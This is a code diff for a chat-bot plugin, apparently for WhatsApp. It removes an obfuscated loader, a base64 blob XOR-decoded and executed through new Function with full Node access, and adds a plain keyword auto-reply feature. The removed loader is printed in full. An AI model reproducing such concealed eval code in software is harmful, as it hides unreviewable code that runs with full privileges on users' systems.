@@ -1,9 +1,67 @@
 'use strict';
-(function(){
-  const K=Buffer.from('REVDQU5YTUQtMjAyNg==','base64');
-  const D='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';
-  const X=Buffer.from(D,'base64');
-  for(let i=0;i<X.length;i++) X[i]^=K[i%K.length];
-  const C=X.toString('utf8');
-  return (new Function('require','module','exports','__filename','__dirname','process','Buffer',C))(require,module,exports,__filename,__dirname,process,Buffer);
-})();
+const { UserError, escRe, bold } = require('../lib/util');
+
+module.exports = ({ def, hooks }) => {
+  // storage: filters = { chat: { <jid>: {kw: reply} }, group: {kw: reply}, pm: {kw: reply} }
+  const load = ctx => ctx.get('filters', { chat: {}, group: {}, pm: {} });
+  const bucket = (f, scope, chat) => (scope === 'chat' ? (f.chat[chat] ||= {}) : f[scope]);
+  const parse = a => {
+    const i = a.indexOf(':');
+    if (i < 1) return null;
+    const kw = a.slice(0, i).trim().toLowerCase(), rp = a.slice(i + 1).trim();
+    return kw && rp ? { kw, rp } : null;
+  };
+
+  const SCOPES = {
+    filter: ['chat', 'this chat'], gfilter: ['group', 'all groups'], pfilter: ['pm', 'all private chats']
+  };
+  for (const [name, [scope, where]] of Object.entries(SCOPES)) {
+    def(name, { cat: 'autoreply', owner: true, usage: `${name} keyword: reply text`, desc: `Auto-reply to a word in ${where}. Without arguments it lists them.` }, async ctx => {
+      const f = load(ctx);
+      if (!ctx.args) {
+        const b = bucket(f, scope, ctx.chat);
+        const rows = Object.entries(b);
+        return ctx.reply(rows.length ? rows.map(([k, v]) => `• ${bold(k)} → ${v}`).join('\n') : `No filters for ${where}.\nAdd one: *${ctx.var('PREFIX')}${name} hello: Hi there!*`, { title: `Filters (${where})` });
+      }
+      const p = parse(ctx.args);
+      if (!p) throw new UserError(`Format: *${ctx.var('PREFIX')}${name} keyword: reply text*`);
+      bucket(f, scope, ctx.chat)[p.kw] = p.rp;
+      ctx.set('filters', f);
+      await ctx.reply(`✅ Filter saved for ${where}: *${p.kw}*`);
+    });
+  }
+  const STOPS = { stop: 'chat', gstop: 'group', pstop: 'pm' };
+  for (const [name, scope] of Object.entries(STOPS)) {
+    def(name, { cat: 'autoreply', owner: true, usage: `${name} <keyword> | ${name} all`, desc: `Remove ${scope === 'chat' ? 'a filter from this chat' : scope === 'group' ? 'a group filter' : 'a private-chat filter'}.` }, async ctx => {
+      const f = load(ctx);
+      const b = bucket(f, scope, ctx.chat);
+      const a = ctx.args.trim().toLowerCase();
+      if (!a) throw new UserError('Which keyword? Use *all* to remove every filter in this scope.');
+      if (a === 'all') { for (const k of Object.keys(b)) delete b[k]; }
+      else if (b[a] !== undefined) delete b[a];
+      else throw new UserError('No filter with that keyword.');
+      ctx.set('filters', f);
+      await ctx.reply(a === 'all' ? '🧹 All filters removed.' : `🗑️ Filter *${a}* removed.`);
+    });
+  }
+
+  hooks.push({
+    name: 'autoreply', run: async ctx => {
+      if (ctx.fromMe || !ctx.fresh || !ctx.text || ctx.text.startsWith(ctx.prefix || '.') || ctx.chat === 'status@broadcast') return false;
+      const f = ctx.get('filters', null);
+      if (!f) return false;
+      const sets = [f.chat?.[ctx.chat], ctx.isGroup ? f.group : f.pm].filter(Boolean);
+      const low = ctx.text.toLowerCase();
+      for (const b of sets) {
+        for (const [kw, rp] of Object.entries(b)) {
+          if (new RegExp(`(^|[^\\p{L}\\p{N}])${escRe(kw)}($|[^\\p{L}\\p{N}])`, 'iu').test(low)) {
+            if (!ctx.cooldown(5, 'filter:' + kw)) return false;
+            await ctx.send({ text: rp.replace(/\{name\}/gi, ctx.name || '') }, { quoted: ctx.msg });
+            return false;
+          }
+        }
+      }
+      return false;
+    }
+  });
+};
